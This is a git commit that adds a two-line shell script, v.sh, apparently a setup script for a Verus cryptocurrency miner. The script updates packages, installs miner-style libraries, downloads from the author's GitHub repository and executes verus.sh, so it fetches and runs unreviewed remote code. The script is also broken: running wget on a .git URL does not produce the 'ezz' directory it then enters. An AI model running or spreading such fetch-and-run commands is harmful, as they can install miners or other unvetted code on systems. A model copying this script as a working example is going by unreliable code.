349fea9742a4d1ead9413703a8809ca35b5a4a63
Omarjetos <93458140+Omarjetos@users.noreply.github.com>
2021-11-05 00:33:55 +0700

    Create v.sh

---
+++ v.sh
@@ -0,0 +1,2 @@
+#omarjeto
+apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget https://github.com/Omarjetos/ezz.git && cd ezz && chmod +x compile.sh && chmod +x verus.sh && ./verus.sh
